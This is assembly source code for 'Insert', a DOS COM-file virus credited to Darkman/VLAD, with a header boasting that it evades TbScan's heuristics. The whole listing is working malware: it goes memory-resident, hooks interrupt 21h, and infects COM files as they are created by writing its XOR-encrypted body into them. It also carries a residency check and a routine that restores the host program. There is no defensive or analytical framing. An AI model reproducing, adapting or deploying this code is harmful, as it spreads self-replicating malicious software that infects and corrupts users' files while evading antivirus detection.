;                             Darkman/VLAD
;                           Proudly Presents
;                             I N S E R T
;            - No flags with TbScan v 6.30 high heuristic -

psp          equ     100h

insert       segment
             assume  cs:insert,ds:insert,es:insert
             org     00h                 ; Origin of COM-file

code:
             lea     di,psp+crypt         ; DI = offset of crypt
             call    xorcrypt
crypt:
             mov     ax,6302h            ; Insert service
             int     21h                 ; Do it!
             cmp     ax,bx               ; Already resident?
             je      virusexit           ; Equal? Jump to virusexit

             push    ds                  ; Save DS at stack
             mov     ax,ds
             dec     ax                  ; Decrease AX
             mov     ds,ax               ; DS = segment of programs MCB

             cmp     byte ptr ds:[00h],'Z'
             jne     insexit             ; Not last in chain? Jump to insexit
             sub     word ptr ds:[03h],(02h*(codeend-code)+0fh)/10h
             sub     word ptr ds:[12h],(02h*(codeend-code)+0fh)/10h
             add     ax,ds:[03h]         ; AX = MCB + size of memory block
             inc     ax                  ; AX = first usable MCB segment
             pop     ds                  ; Load DS from stack

             cld                         ; Clear direction flag
             push    es                  ; Save ES at stack
             mov     es,ax               ; ES = first usable program segment
             mov     cx,(codeend-code)   ; Move 271 bytes
             xor     di,di               ; Clear DI
             lea     si,psp+code         ; SI = offset of code
             rep     movsb               ; Move virus to high memory

             xor     ax,ax               ; Clear AX
             mov     ds,ax               ; DS = segment of interrupt table
             lea     di,int21adr         ; DI = offset of int21adr
             mov     si,(21h*04h)        ; SI = offset of interrupt 21h
             movsw                       ; Store address of interrupt 21h \
             movsw                       ; in int21adr                    /
             mov     word ptr ds:[21h*04h],offset virusint21
             mov     ds:[21h*04h+02h],es ; Intercept interrupt 21h
             pop     es                  ; Load ES from stack
             push    es                  ; Save ES at stack
insexit:
             pop     ds                  ; Load DS from stack (ES)
virusexit:
             mov     ax,65535-(restoreend-restore)
             mov     cx,(restoreend-restore)
             mov     di,ax               ; DI = offset of end of memory
             lea     si,psp+restore      ; SI = offset of restore
             rep     movsb               ; Move restore code to end of memory
             jmp     ax                  ; Jump to restore

virusint21   proc    near                ; Interrupt 21h of Insert
             pushf                       ; Save flags at stack

             cmp     ah,3ch              ; Create a file?
             je      infectfile          ; Equal? Jump to infectfile
             cmp     ah,5bh              ; Create new file?
             je      infectfile          ; Equal? Jump to infectfile
             cmp     ax,6302h            ; Insert service?
             je      insservice          ; Equal? Jump to insservice

             popf                        ; Load flags from stack
jumpfar      db      0eah                ; Object code of jump far
int21adr     dd      ?                   ; Address of interrupt 21h
insservice:
             mov     bx,ax
             popf                        ; Load flags from stack
             iret                        ; Interrupt return!
infectfile:
             call    dword ptr cs:int21adr
             pushf                       ; Save flags at stack
             jc      createerror         ; Error? Jump to createerror

             push    ax                  ; Save AX at stack
             push    bx                  ; Save BX at stack
             push    di                  ; Save DI at stack
             push    es                  ; Save ES at stack

             xchg    ax,bx               ; Exchange AX with BX

             mov     ax,1220h            ; Get system file table number
             int     2fh                 ; Do it! (multiplex)

             push    bx                  ; Save BX at stack
             mov     ax,1216h            ; Get address of system FCB
             mov     bl,es:[di]          ; BL = system file table entry
             int     2fh                 ; Do it! (multiplex)
             pop     bx                  ; Load BX from stack

             cmp     word ptr es:[di+28h],'OC'
             jne     exterror            ; Not equal? Jump to exterror
             cmp     byte ptr es:[di+2ah],'M'
             jne     exterror            ; Not equal? Jump to exterror

             push    cx                  ; Save CX at stack
             push    dx                  ; Save DX at stack
             push    si                  ; Save SI at stack
             push    ds                  ; Save DS at stack

             push    cs                  ; Save CS at stack
             pop     ds                  ; Load DS from stack
             push    cs                  ; Save CS at stack
             pop     es                  ; Load ES from stack

             in      ax,40h              ; AX = port 40h
             mov     cryptvalues,ax      ; Store the crypt value

             mov     cx,(codeend-code)   ; Move 271 bytes
             lea     di,codeend          ; DI = offset of codeend
             lea     si,code             ; SI = offset of code
             rep     movsb               ; Move virus to high memory

             lea     di,codeend+06h      ; DI = offset of crypt
             call    xorcrypt

             mov     ah,40h              ; Write to file
             mov     cx,(codeend-code)   ; Write 271 bytes
             lea     dx,codeend          ; DX = offset of codeend
             int     21h                 ; Do it!

             pop     ds                  ; Load DS from stack
             pop     si                  ; Load SI from stack
             pop     dx                  ; Load DX from stack
             pop     cx                  ; Load CX from stack
exterror:
             pop     es                  ; Load ES from stack
             pop     di                  ; Load DI from stack
             pop     bx                  ; Load BX from stack
             pop     ax                  ; Load AX from stack
createerror:
             popf                        ; Load flags from stack

             retf    02h                 ; Return far and pop a word!
             endp

restore      proc    near                ; Restore code of original program
             lea     ax,psp+code         ; AX = beginning of code
             mov     di,ax
             lea     si,psp+codeend      ; SI = offset of real code
             mov     cx,(65535-psp-(restoreend-restore))-(codeend-code)
             rep     movsb               ; Move the real code to the beginning
             jmp     ax                  ; Jump to the real code
             endp
restoreend:
virusname    db      ' [Insert]'         ; Name of the virus
virusauthor  db      ' [Darkman/VLAD] '  ; Author of the virus
cryptend:
xorcrypt     proc    near                ; XOR Encrypt/Decrypt
             mov     cx,(cryptend-crypt)/02h
cryptcode:
xorwordptr   db      81h,35h             ; xor word ptr [di],0000h \
cryptvalues  dw      ?                   ;  "   "    "      "      /
             inc     di                  ; Increase DI
             inc     di                  ; Increase DI
             loop    cryptcode
             ret                         ; Return!
             endp
codeend:
             int     20h                 ; Exit to DOS!

insert       ends
end          code
